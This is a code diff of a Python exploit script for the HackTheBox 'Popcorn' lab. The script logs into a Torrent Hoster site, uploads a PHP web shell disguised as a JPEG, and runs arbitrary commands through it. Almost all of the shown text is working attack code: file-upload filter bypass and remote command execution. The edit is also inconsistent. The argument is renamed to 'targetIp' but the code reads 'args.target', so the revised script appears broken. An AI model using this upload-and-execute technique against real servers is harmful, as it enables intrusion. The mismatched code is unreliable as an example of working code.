@@ -3,8 +3,6 @@ from colorama import Fore, Style
 import argparse
 import base64
 
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
 
 def format_text(title, item):
     cr = '\r\n'
@@ -15,7 +13,7 @@ def format_text(title, item):
 
 
 parser = argparse.ArgumentParser(description='Upload shell into Torrent Hoster website (Popcorn hackthebox)')
-parser.add_argument("--hostname", default='10.10.10.6', type=str, help="hostname")
+parser.add_argument("--targetIp", default='10.10.10.6', type=str, help="hostname")
 parser.add_argument("--username", default=None, type=str, help="Your username")
 parser.add_argument("--password", default=None, type=str, help="Your password")
 parser.add_argument("--torrentId", default='12627cf538d2c6a9268e7eb41e30cba06822007b', type=str, help="Your torrent id")
@@ -29,7 +27,7 @@ payload = {
 
 session = requests.Session()
 
-rlogin = session.post('http://' + args.hostname + '/torrent/login.php', payload)
+rlogin = session.post('http://' + args.target + '/torrent/login.php', payload)
 
 if 'Invalid login, please try again' in rlogin.text:
     print(format_text('Invalid login', ''))
@@ -83,11 +81,11 @@ else:
         print(str(e))
         exit(0)
 
-    url = 'http://' + args.hostname + '/torrent/upload_file.php?mode=upload&id=' + args.torrentId
+    url = 'http://' + args.target + '/torrent/upload_file.php?mode=upload&id=' + args.torrentId
     files = {'file': ('shell.jpg.php', open('shell.jpg.php', 'rb'), 'image/jpeg')}
     r = session.post(url, files=files)
     print(format_text('Suceesfull upload:', r.text))
 
-    rShell = session.get('http://' + args.hostname + '/torrent/upload/' + args.torrentId + '.php?cmd=' + args.command)
+    rShell = session.get('http://' + args.target + '/torrent/upload/' + args.torrentId + '.php?cmd=' + args.command)
     print(format_text('Command executed:', str(rShell.content).split('<pre>')[1].replace("\\n</pre>'", '')))
     exit(0)
